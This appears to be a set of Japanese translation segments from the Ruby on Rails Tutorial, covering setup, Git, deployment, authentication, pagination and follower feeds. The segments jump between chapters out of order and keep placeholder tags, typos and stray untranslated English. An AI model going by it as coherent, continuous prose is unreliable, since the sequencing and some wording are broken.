JavaScriptに精通している方のために補足すると、この機能は組み込みクラスのプロトタイプオブジェクトを使用してクラスを拡張することと似ています
(読者の\href{http://getsatisfaction.com/railstutorial/topics/adding_methods_to_built_in_classes_comparable_to_using_javascripts_prototype_object}{Erik Eldridge}による指摘に感謝します)。
このため、とにかくWebアプリケーションを書けるようになりたい方は、最初にRailsを学び、次にRubyを学んでから再びRailsに戻ってくることをお勧めします。
その他の変更はリポジトリにコミットしましょう。
次に\kode{params}ハッシュを作成し、\kode{params[:father]}は\kode{person1}、\kode{params[:mother]}は\kode{person2}、そして\kode{params[:child]}は \kode{person3}になるようにしてください。
Ruby API のオンラインマニュアルを見つけて、\kode{Hash}クラスの\kode{merge}メソッドについて読んでみてください。
これはリスト\ref{code:contact_page_test}で使用されていました。
\href{http://0.0.0.0:3000/sessions/new}{/sessions/new}フォームを送信すると図\ref{fig:initial_failed_login_rails_3}のようになります。
最初に、HomeページとHelpページへのリンクを持つヘッダーパーシャル\kode{_header.html.erb} (リスト\ref{code:header_partial_links}) から取りかかります。
フッターパーシャル\kode{_footer.html.erb}にもリンクがあります。これらはAboutページとContactページへのリンクです (リスト\ref{code:footer_partial_links})。
これで、レイアウトに{0}{1}第3章{/1}{/0}で作成したすべての静的ページへのリンクができました。たとえば\href{http://0.0.0.0:3000/about}{/about}の場合はAboutページ (図\ref{fig:about_page}) に移動します。
{0}図5.8{/0} {1}\href{http://0.0.0.0:3000/about}{/about}で表示されるAboutページ{/1}
ボタンをサインアップページにリンクする。
{0}図5.9{/0} {1}\href{http://0.0.0.0:3000/signup}{/signup}で表示される新しいユーザー登録ページ{/1}
これはリスト\ref{code:full_title_helper_tests}で使用されていました。
\kode{full_title}ヘルパーのテスト。
\href{http://sivers.org}{Derek Sivers}が前書きで述べているように、本書は一本道のストーリーで構成されていて、最初から最後まで飛ばさずに読むことを前提としています。
技術書を飛ばし読みするのが習慣になっている方にとっては少々頭の切り替えが必要になるかもしれませんが、それだけの値打ちは十分にあります。ぜひトライしてみてください。
\emph{Ruby on Railsチュートリアル}をTVゲームにたとえると、あなたは主人公であり、各章をクリアするたびにRails開発者としてレベルアップしていくと考えてください
(演習は\href{http://en.wikipedia.org/wiki/Boss_(video_gaming)#Miniboss}{中ボス}です)。
さらに、Railsは最新のWebテクノロジーやフレームワーク設計に素早く適応しています。
チュートリアルが統合的に構成されていることにより、本書を最後まで完了することができれば、現時点のWeb開発の知識量に関わらず、より高度な情報源を難なく読みこなす実力が身につき、上に挙げたJavaScriptなどのRails以外のトピックについても理解しやすくなります。
言い換えると、本書で扱うトピックの範囲が\emph{広い}ということでもあります。もしまだ十分なプログラミング経験を持っていないのであれば、その情報量の多さに圧倒されるかもしれません。
そこで、読者の経験や知識に応じた、\emph{Railsチュートリアル}を読破するためのアドバイスを用意しました。ぜひ参考にしてください。
「最初からテストを書かないといけないでしょうか？」も定番の質問です。
そこで、もしテストで行き詰まってしまった場合には、そこで長々と悩むよりも思い切って (一周目は) その箇所をスキップしてしまいましょう。よりお勧めの方法は、テストコードの完全な理解については欲張らずに後回しにし、本書のテストは自分の書いたコードが正しく動くかどうかの検証ツールと割り切って使うことです。
Webプログラミングをまったくしたことのない初心者の方が、この\emph{Railsチュートリアル}を難しすぎると感じた場合は、本書を学ぶ前にまずHTMLやCSSの基礎を勉強してください。それらの基礎が身についたら、是非もう一度\emph{Railsチュートリアル}に挑戦してください。
(HTML関連ではこれといったお勧めの教材は思いつかなかったのですが、「\href{http://headfirstlabs.com/books/hfhtml/}{\emph{Head First HTML}}」はなかなかよさそうです。David Sawyer McFarland著「\href{http://www.amazon.com/gp/product/0596526873}{\emph{CSS: The Missing Manual}}」を推薦してくれた読者もいます。)
Peter Cooper著「\href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}}」の最初の2、3章をやってみるのもよいでしょう。同書で扱っているサンプルアプリケーションは、本格的なWebアプリケーションに比べて非常に小さいので、比較的やりやすいと思います。
ただし、Java や C/C++ といった言語と Ruby 言語では、記法が異なるので、少し違和感があるかもしれません。しかし、Ruby 言語の記法に慣れるまでに、そこまで時間はかかりません。
(例えば、行末にセミコロンを書く習慣がついているかもしれませんが、Ruby では行末にセミコロンを置いても問題なく動きます。)
\emph{Rails チュートリアル}では、覚えておく必要のあるWeb特有の概念をすべてカバーしているので、\texttt{POST}や\texttt{PATCH}の違いが分からなくても今は心配する必要はありません。
本書でカバーする基本的な概念については既に知っていると思いますが、テスト駆動開発やREST構造などの概念については馴染みがない方もいるでしょう。
また、Ruby には特有のクセがあるので、これも本書で初めて触れる知識になるでしょう。
読者からのフィードバックを読んだ限りでは、そのような方であっても本書から多くのことを学べるはずだと自信を持って言えます。
本書には、そうした方々が初めてRailsを学んだ頃よりも新しい技術がふんだんに盛り込まれているため、本書で学ぶ技術はきっと役に立つはずです。
最後に、\emph{Ruby on Railsチュートリアル}を読み終えた経験豊富なプログラマの方には、さらに高度な話題を扱っている「\href{http://www.amazon.com/gp/product/1933988657}{\emph{The Well-Grounded Rubyist}}」(David A. Black 著) または「\href{http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional-Series/dp/0321584104/}{\emph{Eloquent Ruby}}」(Russ Olsen 著) をお勧めします。あるいは、トピック別に書かれている「\href{http://www.amazon.com/gp/product/0672328844}{\emph{The Ruby Way}}」(Hal Fulton 著) を読んでみるのも良いでしょう。
本節を続ける前に、一旦ここで、初期の頃から Rails フレームワークに対して指摘されていた「Rails はスケールできない」という主張について触れたいと思います。すなわち、「Rails では大量のトラフィックを捌く<n>ことができない」という主張です。
この主張の一部には、間違った認識があります。それは、\href{http://idleprocess.wordpress.com/2009/11/24/presentation-summary-high-performance-at-massive-scale-lessons-learned-at-facebook/}{あなたが\emph{Webサイト}をスケールさせるのであって、フレームワークがWebサイトをスケールさせるのではない}、ということです。Rails は素晴らしいフレームワークではありますが、しかし、ただのフレームワークでしかありません。
したがって、本来のあるべき問いは「Rails で構築されたWebサイトはスケールできるのか？」となります。
そして、今となっては、この主張の答えは明白です。なぜなら、世界で最もトラフィックの大きいWebサイトのいくつかは、Rails で構築されているからです。
ただし、Webサイトをスケール\emph{させる}ことは、Rails だけで出来ることではありません。Rails 以外の知識も必要になります。といっても、Hulu や Yellow Pages といった大量のトラフィックを捌いているWebアプリケーションも Rails で構築されているので、そこまで心配する必要はありません。少なくとも、\emph{あなたの}アプリケーションが Hulu や Yellow Pages 並みに成長するまでの間は、「Rails だからスケールできない」ということにはならないでしょう。
\emph{Railsチュートリアル}を読んでいて、チュートリアル内部の別セクション番号へのリンクをクリックして移動したら、なるべくすぐに元の場所に戻ることをお勧めします。
Webページで読んでいる場合は、ブラウザの [戻る] ボタンで戻れます。Adobe ReaderやOS XのプレビューでPDF版を読んでいる場合でも、同様に戻る方法があります。
Adobe Readerの場合は、ドキュメント画面を右クリックして [Previous View]をクリックします。
OS X Previewの場合はメニューの \texttt{[移動] > [戻る]} で戻れます。
\kode{sudo}コマンドを実行するとデフォルトでroot (スーパーユーザー) に切り替わるためか、多くの人がsudoコマンドを "superuser do" の略だと誤って信じています。
正しくは、\kode{sudo}は\kode{su}コマンドと英語の “do” をつなげたものです。そして\kode{su}コマンドは “substitute user” (ユーザーの切替) の略なのです。ターミナルで\kode{man su}と入力すればこのことを確認できます。
語源学の示すところによれば “SOO-doo” と発音しますが (“do” は “doo” と発音するので)、“SOO-doh” という発音もよく使われます。
なお、Windowsのコマンドプロンプトでは、ディレクトリの区切りは次のようにバックスラッシュまたは円マークで表示されます。
C:\Sites\sample_app
この点を明確にするため、\emph{Railsチュートリアル}では、「Railsルート」については\emph{(Railsで作成した)Webアプリケーションのルートディレクトリ}を指すものとします。また、すべてのディレクトリは、このルートディレクトリを起点とした相対パスで示します。
たとえば、著者のサンプルアプリケーションの \kode{config} ディレクトリは、次の場所にあります。
このとき、このRailsアプリケーションのルートディレクトリは、\kode{config}ディレクトリの1つ上の階層にあります。したがって、以下の場所がルートディレクトリになります。
長いパスを毎回表記すると読みづらくなるので、本書では以下のようなディレクトリパスを参照する場合、
アプリケーションのルートパスを省略して、単純に\kode{config/routes.rb}と表記することにします。
# gem 'therubyracer', platforms: :ruby
# Read more: https://github.com/rails/turbolinks
# Use unicorn as the app server
# Use debugger
# gem 'debugger', group: [:development, :test]
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
以下の構文を実行すると
\kode{uglifier}のバージョンが\kode{1.3.0}以上であれば最新バージョンのgemがインストールされます。 極端に言えばバージョンが\kode{7.2}であってもそれが最新ならインストールされます。なお、uglifierはAsset Pipelineでファイル圧縮を行うためのものです。
一方、例えば、以下のコードを実行すると
\kode{coffee-rails} (これもAsset Pipelineで使用するgemです) のバージョンが\kode{4.0.0}より大きく、\kode{4.1}より小さい場合にインストールするようになります。
経験上、残念ながらマイナーアップグレードですら問題を引き起こすことがあります。このため、\emph{Railsチュートリアル}では基本的にすべてのgemでバージョンをピンポイントで指定しています。
なお、\kode{install}は省略可能です。
実は、\kode{bundle}コマンドは\kode{bundle install}のエイリアスでもあります。
=> Rails application starting on http://0.0.0.0:3000
プロジェクトを開く
  $ <エディタ名> .
  $ subl .
(\kode{vim}というコマンド名は、使用している「フレーバー」によっては\kode{gvim}や\kode{mvim}などになっていることがあります。)
手順の最後として、Gitのコミットメッセージを入力するときに使用するエディタを設定できます。
Sublime Text、TextMate、gVim、MacVimなどのGUIエディタを使用する場合、シェルから離れずシェル内で起動するようフラグを付けてください
GUIエディタの起動後もターミナルを使用し続けることはできます。ただし、Gitはデタッチ時にコミットメッセージが空のままファイルを閉じたとみなすため、コミットは中断されます。
Gitのエディタオプションで\kode{subl}や\kode{gvim}にフラグを付けないと、このあたりの動作で頭が混乱するかもしれません (訳注: gitのエディタ設定はGUIエディタとあまり相性がよくないらしく、vimやnanoのようなコマンドベースのエディタを選択するのが無難なようです)。
この注釈の意味がよくわからない場合は、無視しても構いません。
\kode{"subl -w"} の部分は、TextMateの場合は \kode{"mate -w"}、gVimの場合は\kode{"gvim -f"}、MacVimの場合は\kode{"mvim -f"} にそれぞれ置き換えます。
ここで１つ問題があります。Gitは\emph{すべての}ファイルの変更履歴を管理するようになっていますが、管理対象に含めたくないファイルもあります。
たとえば、Railsによって作成されるログファイルは頻繁に内容が変わるので、いちいちバージョン管理に更新させたくありません。
Gitにはこういったファイルを管理対象から除外する機能があります。\kode{.gitignore}というファイルをアプリケーションのルートディレクトリに置き、除外したいファイルを指定するためのルールをそこに記載します
\kode{.gitignore}がディレクトリに見当たらない場合は、ファイルブラウザやエクスプローラで隠しファイルを表示するよう設定を変更する必要があるかもしれません。
selfを省略した結果をリスト\ref{code:default_gitignore}に示します。
\kode{rails}コマンドで作成されるデフォルトの\kode{.gitignore}ファイルの内容。
# See http://help.github.com/ignore-files/ for more about ignoring files.
# If you find yourself ignoring temporary files generated by your text editor
# or operating system, you probably want to add a global ignore instead:
#   git config --global core.excludesfile '~/.gitignore_global'
# Ignore bundler config.
/.bundle
# Ignore the default SQLite database.
/db/*.sqlite3
/db/*.sqlite3-journal
# Ignore all logfiles and tempfiles.
/log/*.log
これらのファイルは頻繁に更新されるため、バージョン管理に含めるのは何かと不便です。
さらに、他の開発者と共同作業を行う場合にこのようなファイルをバージョン管理に含めると無用な衝突 (conflict) が発生し、関係者一同が無用のストレスにさらされることになりかねません。
この\kode{.gitignore}では、Railsドキュメントファイル、VimやEmacsのスワップファイル、そしてOS Xユーザーにはお馴染みの、あのいまいましい\kode{.DS_Store}ディレクトリ (MacのFinder操作で作成される隠しディレクトリ) も管理対象から除外されます。
より多くのパターンを除外する\kode{.gitignore}ファイル。
# Ignore other unneeded files.
*.swp
.project
DS_Store
.idea
.secret
最後に、新しく作成したRailsプロジェクトのファイルをGitに追加し、次にそれをコミットします。
ファイルを追加する (\kode{.gitignore}で指定されているものを除く) には、以下のコマンドを実行します。
上で述べたように、\kode{git branch -D}でトピックブランチ上の変更を破棄することもできます。
更新した\kode{Gemfile}を\ref{code:gemfile_pg_gem}に示します。
#ruby-gemset=railstutorial_rails_4_0
(著者の場合、RVMのgemsetも次の行で指定しています。
たとえばRuby \kode{’1.9.3’}を使用しているのであれば、そのバージョン番号に書き換えてください。本書での指定とは若干異なることになりますが、この変更は問題ありません)。
追加のgemを含んだ\kode{Gemfile}。
{0}{1}リスト1.14{/1}{/0}で追加したgemは本番環境でしか使用しないので、このフラグを追加したコマンドを実行すると本番用gemはローカルに追加されません。今このコマンドを実行するのは、後の本番環境へのデプロイに備えて\kode{Gemfile.lock}を更新し、\texttt{pg} gemと\texttt{rails_12factor} gem、Rubyバージョンの指定をGemfile.lockにはんえいs必要があるためです。
ここまでの進捗をTwitterに投稿したりFacebookで通知するには以下のリンクからどうぞ。
プロフィール画面 (\href{http://0.0.0.0:3000/users/2}{/users/2}) に [Follow] ボタンが表示されている
{0}図12.13{/0} {1}プロフィール画面 (\href{http://0.0.0.0:3000/users/5}{/users/5}) に [Unfollow] ボタンが表示されている{/1}
次に、すべてのユーザーを一覧できるようにします (もちろん認証を要求します)。これはサンプルデータとページネーション (pagnation) を導入する動機にもなります。
beforeフィルターを使って実装した結果 (リスト\ref{code:authorize_before_filter}) は、一度ログアウトしてユーザー編集ページ (\href{http://0.0.0.0:3000/users/1/edit}{/users/1/edit}) にアクセスしてみることで確認できます (図\ref{fig:protected_log_in})。
selfを省略した結果をリスト\ref{code:fixture_second_user}に示します。
フォワーディング自体を実装するには、\kode{redirect_back_or}メソッドを使用します。リクエストされたURLが存在する場合はそこにリダイレクトし、ない場合は何らかのデフォルトのURLにリダイレクトします。デフォルトのURLは、Sessionコントローラの\kode{create}アクションに追加し、サインイン成功後にリダイレクトします (リスト\ref{code:friendly_session_create})。
このコードは、値が\kode{nil}でなければ\kode{session[:forwarding_url]}を評価し、nilであれば与えられたデフォルトのURLを使用します
リスト\ref{code:friendly_forwarding_code}では、session.delete(:forwarding_url) という式を通して転送用のURLを削除している点に注意してください。これをやっておかないと、次回ログインしたときに保護されたページに転送されてしまい、ブラウザを閉じるまでこれが繰り返されてしまいます
{0}図11.7{/0} {1}ユーザープロフィール (\href{http://0.0.0.0:3000/users/1}{/users/1}) とマイクロポスト{/1}
{0}図11.8{/0} {1}別ユーザーのプロフィールとマイクロポスト (\href{http://0.0.0.0:3000/users/5}{/users/5}){/1}
まず、\emph{Gemfile}に\kode{Faker} gemを追加します (リスト\ref{code:faker_gemfile})。これは、実際にありそうなユーザー名とメールアドレスを持つサンプルユーザーを自動的に作成するものです。
\kode{Gemfile}にFakerを追加する
更新した\kode{Gemfile}をリスト\ref{code:will_paginate_gem}に示します。
\texttt{Gemfile}に\kode{will_paginate}を追加する
Homeページ (\href{http://0.0.0.0:3000/}{/}) にマイクロポストの投稿フォームを追加する
[\href{http://0.0.0.0:3000/users?page=2}{2}] リンクまたは [\href{http://0.0.0.0:3000/users?page=2}{Next}] リンクをクリックすると、図\ref{fig:user_index_page_two_rails_3}のように次のページに移動します。
selfを省略した結果をリスト\ref{code:users_fixtures_extra_users}に示します。
Railsは\kode{@users}を\kode{User}オブジェクトのリストであると推測します。さらに、ユーザーのコレクションを与えて呼び出すと、Railsは自動的にユーザーのコレクションを列挙し、それぞれのユーザーを\kode{_user.html.erb}パーシャルで出力します (訳注: each doとendで囲む必要がなくなります)。
図\ref{fig:home_with_form}のフォームが正しく動作しているかどうかを確認したい場合、正しいエントリーを投稿した後、\href{http://0.0.0.0:3000/users/1}{プロフィールページ}に移動してポストを表示すればよいのですが、これはかなり面倒な作業です。
このような危険があるからこそ、編集してもよい属性だけを許可するように処理されたパラメータを渡すことが重要になります。
selfを省略した結果をリスト\ref{code:action_tests_admin}に示します。
\kode{render @users}を実行すると、自動的に\kode{_user.html.erb}パーシャルを参照し、各ユーザーをコレクションとして表示する
\emph{ヒント:} Webを検索してみましょう。この目的にうってつけの堅牢なメソッドが見つかるはずです。\kode{_blank}という文字も一緒に検索してみてください。
リスト{p0}のパーシャルを使用して、{2}new.html.erb{/2}ビューと{2}edit.html.erb{/2}ビューをリファクタリングし、コードの重複を取り除いてください。
このとき、リスト{p0}のようにフォーム変数{2}f{/2}を明示的にローカル変数として渡す必要があることに注意してください。また、provide関数を使うと、パーシャル化したnewフォームやeditフォームの重複をさらに取り除くことも可能です (Jose Carlos Montero Gómezの指摘に感謝します)。
サインインしたユーザーは、もはやUsersコントローラの\kode{new}アクションや \kode{create}アクションにアクセスする必要はありません。
サインインしたユーザーがこれらのアクションをブラウザで開こうとしたら、ルートURLにリダイレクトするようにしてください。
\kode{destroy}アクションを改造し、管理者が自分自身を削除できないようにしてください。
(最初にテストを作成してからにしてください。)
newフォームとeditフォームのフィールドに使用するパーシャル。
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
注: 以前のバージョンのRailsでは、\kode{rails.png}というロゴマークが自動的にすべてのRailsプロジェクトにインストールしていましたが、最新バージョンのRailsでは\kode{rails new}による生成時にこのロゴマークを含めなくなりました。このロゴマークが必要な方は、Ruby on Rails公式ページ (\href{http://rubyonrails.org/images/rails.png}{http://rubyonrails.org/images/rails.png}) からダウンロードして\kode{app/assets/images/}ディレクトリにおいてください
\kode{header}タグに\kode{navbar-fixed-top}クラスが与えられているので、これに従ってBootstrapはナビゲーションバーをページ上部に固定し、ナビゲーションバーの下に余白を置いて主要部分から分離します
この行では、\kode{app/views/layouts/_shim.html.erb}というファイルを探してその内容を評価し、結果をビューに挿入しています
ここまでくれば、ファイル名は\kode{_footer.html.erb}で、layoutsディレクトリ (リスト\ref{code:footer_partial}) に置けばよいということがわかると思います
ビューそのものは1ページのコードですが、サイトのデータベースから取り出した情報を使用して各プロファイルの表示をカスタマイズします。
ローカルのRailsサーバーではconsoleのデフォルトの環境として\texttt{development}が使用されますが、以下のように他の環境でconsoleを実行することもできます。
ユーザー表示ページ用のテスト。
ユーザーを表示するために、標準的なRailsの場所を使用することにします。\kode{app/views/users/show.html.erb}です。
リスト{p0}でジェネレータを使用して作成した{2}new.html.erb{/2}ビューと異なり、この{2}show.html.erb{/2}ファイルは自動的には作成されないので、手動で作成します。このファイルを作成後、リスト\ref{code:stub_user_view}の内容を貼り付けてください。
1番目のときと同様、\kode{generate}を実行して、現時点での要求である新規ユーザー用のサインアップページ (スタブ) を持つ、最も簡単なコントローラを作成します。
Usersコントローラにリクエストが正常に送信されると、\kode{params[:id]}の部分はユーザーidの\texttt{1}に置き換わります。従って、この箇所は以下の\kode{find}メソッドと同等です。
ユーザーのビューとアクションが定義されたので、URL \href{http://0.0.0.0:3000/users/1}{/users/1} は完全に動作するようになりました (図\ref{fig:user_show_rails})。
図\ref{fig:user_show_rails}のデバッグ情報で\kode{params[:id]}の値を確認できることにも注目してください。
アプリケーションでカスタムGravatarを利用できるようにするために、\kode{update_attributes} (\ref{sec:updating_user_objects}) を使用してデータベース上のユーザー情報を更新します。
{0}図7.10{/0} {1}現状のユーザー登録ページ  \href{http://0.0.0.0:3000/signup}{/signup}{/1}
最も簡単な方法は、Rakeの\kode{db:reset}タスクを実行してデータベースをリセットすることです。
システム環境によっては、データベースをリセットした後にもう一度prepareを実行しておく必要が生じることがあります。
最後に、システムによっては変更を反映するためにターミナルで\texttt{Ctrl-C}を押してWebサーバーを再起動する必要が生じることもあります
Railsは、\kode{form_for(@user)}を使用してフォームを構成すると、\kode{@user.new_record?}が\kode{true}のときには\texttt{POST}を、\kode{false}のときには\texttt{PATCH}を使用します。
Railsはこれらの\kode{name}の値を使用して、初期化ハッシュを (\kode{params}変数経由で) 構成します。このハッシュは、ユーザーが入力した値に基づいてユーザーを作成するとき (\ref{sec:unsuccessful_signups}) に使用されます。
ユーザー登録の失敗に対応できる\kode{create}アクション。
/users/1のようなURLの場合、\kode{params[:id]}の値は該当するユーザーの\kode{id} (この例では\kode{1}) になります。
最後に、リファクタリングではありますが、一般的な慣習に倣って\kode{current_user?}という論理値を返すメソッドを実装します。\kode{correct_user}の中で使えるようにしたいので、Sessionsヘルパーの中にこのメソッドを追加します (リスト\ref{code:current_user_p})。
このコードはたとえば\kode{"0 errors"}、\kode{"1 error"}、\kode{"2 errors"}などのように、エラーの数に応じて活用された単語を返します。これにより、\kode{"1 errors"}のような英語の文法に合わない文字列を避ける事ができます。 (a distressingly common mistake on \href{http://www.urbandictionary.com/define.php?term=interwebs}{teh interwebs}).
さらにRailsは、エラーページにある、\kode{div}で囲まれたエラーCSSクラス\kode{field_with_errors}を適用しています。
また、 \kode{assert_no_difference}メソッドのブロック内で\kode{post}関数を使い、メソッドの引数には\kode{’User.count’}を与えています。これは、 \kode{assert_no_difference}のブロックを実行する前後で引数の値 (\kode{User.count}) が変わらないことをテストしています。
先ほど定義した\kode{store_location}メソッドを使って、早速beforeフィルターの\kode{logged_in_user}を修正してみます (リスト\ref{code:add_store_location})。
ユーザー登録フォームを完成させるために、リスト\ref{code:first_create_action}のコメントアウトされた部分にコードを書き、適切に動作するようにしましょう。
適用するCSSクラスをメッセージの種類によって変更するようにしています。これにより、たとえば\kode{:success}キーのメッセージが表示される場合、適用されるCSSクラスは次のようになります。
\kode{assert_no_difference}と同様に、このメソッドは第一引数に文字列 (\kode{’User.count’}) を取り、\kode{assert_difference}ブロック内の処理を実行する直前と、実行した直後の\kode{User.count}の値を比較します。
このテストがパスするためには、Userのルート(リスト\ref{code:users_resource})とUserの \kode{show}アクション(リスト\ref{code:user_show_action})、そして\kode{show.html.erb}ビュー(リスト\ref{code:user_show_view_with_gravatar})がそれぞれ正しく動いている必要があります。
そしてSSLを有効化するのも簡単です。 \kode{production.rb}という本番環境の設定ファイルの1行を修正するだけで済みます。
本番Webサイトが動作するために、設定ファイルの変更をコミットしてHerokuにプッシュする必要があります。
次に、本番データベースでマイグレーションを実行し、HerokuにUserデータモデルを使用することを通知します。
結果として、\ref{sec:unicorn_in_production}でアプリケーションのデプロイが終わると、自動的にSSLが有効化されているはずです。, SSL will automatically be enabled.
selfを省略した結果をリスト\ref{code:unicorn_gemfile}に示します。
Bundlerでは本番環境用のgemはインストールしない設定にしておいたので (\ref{sec:sample_app_setup})、リスト\ref{code:unicorn_config}は開発環境に影響はありません。しかし、Bundlerに\kode{Gemfile.lock}を更新してもらう必要があるので、いつものように次のコマンドを実行しておきます。
リスト\ref{code:unicorn_config}では少しだけコードの見栄えを修正しています。これは標準的な1行80文字の制限に合わせるための変更です。
なお、この\kode{Procfile}はルートディレクトリ (\kode{Gemfile}と同じディレクトリ) に置いておく必要があるので、ファイルの置き場所には注意してください。
ここでいつものように、マイグレーションを実行して\kode{admin}属性を追加しましょう。コマンドラインで、この属性の型を\kode{boolean}と指定します。
\kode{gravatar_for}ヘルパー用のオプションの\kode{:size}パラメーターを定義する。
\kode{_user.html.erb}パーシャルを使って自動的に\kode{@users}変数内のそれぞれのユーザーを出力していました。
今回の場合は、ユーザーコントローラのコンテキストにおいて、\emph{マイクロポスト}をページネーションしたいため、明示的に\kode{@microposts}変数を\kode{ will_paginate}に渡す必要があります。
この場合の\kode{id}属性は単なる整数 (すなわち\kode{self.id}はユーザーのid) であるため危険はありませんが、SQL文にインクルードされる変数を\emph{常に}エスケープする習慣はぜひ身につけてください。
このとき、\kode{@feed_items}の各要素が\kode{Micropost}クラスを持っていたため、RailsはMicropostのパーシャルの呼び出すことができました。
\kode{{1}リスト2.9{/1}}の内容は、{2}UsersController{/2}が{2}MicropostsController{/2}に置き換わっているほかは\emph{{1}リスト2.4{/1}}と{4}完全に同一{/4}である点にご注目ください。
テキストエディタかIDEを使用して\kode{app/models/micropost.rb}を開き、 {1}{2}リスト2.10{/2}{/1}の内容に置き換えます。
\kode{ActiveRecord::Base}クラスを継承したことによって、作成したモデルオブジェクトはデータベースにアクセスできるようになり、データベースのカラムをあたかもRubyの属性のように扱えるようになります。
これはリスト\ref{code:layout_flash}で使用されていました。
これはリスト\ref{code:flash_test}で使用されていました。
上で説明したことをUserモデルに実装するとリスト\ref{code:before_create_activation_digest}のようになります。
次の\ref{sec:activating_the_account}でテストをもう少し追加し、リファクタリングを少々施せば完了です。
配列\kode{deliveries}はグローバルなので、\kode{setup}メソッドでこれを初期化しておかないと、並行して行われる他のテストでメールが配信されたときにエラーで中断してしまいます (\ref{sec:password_reset_test}でも似た事例をご紹介します)。
表{p0}で示した{2}edit_user_path{/2}という名前付きルートと、 リスト\ref{code:current_user_working}で定義した{2}current_user{/2}というヘルパーメソッドを使うと、実装が簡単です。
リスト\ref{code:sendgrid_config}のメール設定にはSendGridアカウントの\kode{user_name}と\kode{password}設定を記入する行もありますが、そこには記入せず、必ず環境変数「\kode{ENV}」に設定するよう十分ご注意ください。
これはリスト\ref{code:password_reset_expire_test}で使用されていました。
これはリスト\ref{code:general_authenticated_p}で使用されていました。
話を戻して、Bootstrapの変数の一覧表を見ると、薄い灰色に対して以下の変数名が与えられることに気が付きます。
{0}第{1}5{/1}章{/0}から{2}第{1}10{/1}章{/2}にかけて、レイアウト、ユーザーのデータモデル、ユーザー登録/認証システムを順に作成し、サンプルアプリケーションの基本的な部分を実装します。
リスト\ref{code:footer_css}のとき
エラーページなど、一般(Webブラウザなど)に直接公開するデータ
42 files changed, 8461 insertions(+), 0 deletions(-)
create mode 100644 README.rdoc
create mode 100644 Rakefile
ここでは、Unixコマンドの\kode{ls}で\kode{app/controllers/}ディレクトリの中身を表示した後、\kode{rm}コマンドをうっかり実行してこのディレクトリを削除してしまったとします ({1}{2}表1.1{/2}{/1})。
\texttt{rails_12factor} gemが追加されている点に注目してください。これは画像やスタイルシートなどの静的なアセットを提供するためにHerokuで使用されます。[BR]<n>[BR]<n>また、sqlite3 gemが本番環境には含まれていない点にも注目してください。これは、今回の本番環境であるHerokuではSQLite3をサポートしていないため、明示的に本番環境からsqlite3 gemを外す必要があります (本番環境に含めてしまうと、デプロイ時にエラーが発生します)。
Railsには\kode{rails}という名前のコマンドラインコマンドがあり、\kode{rails new}で新しいアプリケーションを生成したり、\kode{rails server}でローカルサーバーを実行したりできる。
このリレーションシップは今後\kode{follower_id}と\kode{followed_id}で頻繁に検索することになるので、リスト\ref{code:relationships_migration}に示したように、それぞれのカラムにインデックスを追加します。
表\ref{table:association_methods_relationships}のメソッドを参考にしながら、\kode{following}による関連付けを使って\kode{follow}、\kode{unfollow}、\kode{following?}メソッドを実装していきましょう (リスト\ref{code:follow_unfollow_following})。
次に、\kode{followers.include?}メソッドを使って先ほどのデータモデルをテストしていきます。テストコードはリスト\ref{code:followers_test}のとおりです。
本チュートリアルのいたるところで見てきたように、Railsは慣習に従って、アクションに対応するビューを暗黙的に呼び出します。たとえば、\kode{show}アクションの最後で\kode{show.html.erb}を呼び出すといった具合です。
フォロー/フォロー解除ボタンを動かすためには、フォーム (リスト{p0}/リスト{p2}) から送信されたパラメータを使って、{3}followed_id{/3}に対応するユーザーを見つけてくる必要があります 。その後、見つけてきたユーザーに対して適切に{3}follow{/3}/{3}unfollow{/3}メソッド (リスト\ref{code:follow_unfollow_following}) を使います。
更新の結果をリスト\ref{code:follow_form_ajax}とリスト\ref{code:unfollow_form_ajax}に示します。
図\ref{fig:user_feed}に、サンプルの\kode{microposts}データベーステーブルと、それをフィードした結果を示します。
id 1のユーザーがid 2、7、8、10をフォローしているときのフィード。
この時点ではもちろん実装はありませんが、機能を確認するためのテストは作成できます。
このテストで重要なことは、フィードに必要な3つの条件を満たすことです。1) フォローしているユーザーのマイクロポストがフィードに含まれていること。2) 自分自身のマイクロポストもフィードに含まれていること。3) \emph{フォローしていない}ユーザーのマイクロポストがフィードに含まれていないこと。
最終的な表示がやや込み入っているため、欲張らずに細かい部品を1つずつ確かめながら導入することで最終的なフィードを実装します。
ここで必要なのは、\kode{microposts}テーブルから、あるユーザー (つまり自分自身) がフォローしているユーザーに対応するidを持つマイクロポストをすべて選択 (select) することです。
(上のコードでは、条件部分に\kode{user.id}の代わりにRailsの習慣である\kode{user}を使用していることに注意してください。Railsはこのような場合に自動的に\kode{id}を使用します。
Micropostマイグレーション
(\kode{user_id}と\kode{created_at}にインデックスが与えられていることに注意)
この記法は、実際にはRailsによるコアRuby言語の拡張として行われたのが始まりです。この記法があまりに便利なので、後にRuby自身にまで取り入れられたほどです。
テストスイートを実行して確認することもできます。このテストはパスするはずです。
簡単なアプリケーションであれば、この最初の実装だけでほとんどの目的を達成できるでしょう。
しかし、私たちのサンプルアプリケーションの実装にはまだ足りないものがあります。それが何なのか、次の節に進む前に考えてみてください
(\emph{ヒント:}フォローしているユーザーが5000人もいたらどうなるでしょうか)。
(実際はどちらでも動作しますが、この文脈では内挿と考える方が筋が通っています)。
このコードはRailsとRubyとSQLが複雑に絡み合っていて厄介ですが、ちゃんと動作します。
(もちろん、サブセレクトを使用すればいくらでもスケールアップできるなどということはありません。
大規模なWebサイトでは、バックグラウンドジョブを使用して、フィードを非同期で生成するなどの対策が必要でしょう。Webサイトのスケーリングのようなデリケートな問題は本書の範疇を超えます)。
(開発サーバーのログ・ファイルに出力されたSQL文を調べることで、このことを確認できます)。
変更したテストをリスト\ref{code:home_feed_test}に示します。
今後の学習の手始めとするために、この節ではサンプルアプリケーションのコア部分のさまざまな拡張方法を提案し、それぞれに必要な学習内容についても示します。
アプリケーションの拡張に取りかかる前に、まずは現状の変更をマージしておきましょう。
必要であれば、いつものようにコードをプッシュして展開します。
\href{http://railscasts.com/}{RailsCasts}。強く推奨します。このRailsCastsの素晴らしさについては、どれほど言葉を尽くしても足りません。
最初に\href{http://railscasts.com/episodes/archive}{RailsCastsエピソードアーカイブ}を開いて、目についたトピックを適当に開くところから始めてみるとよいでしょう。
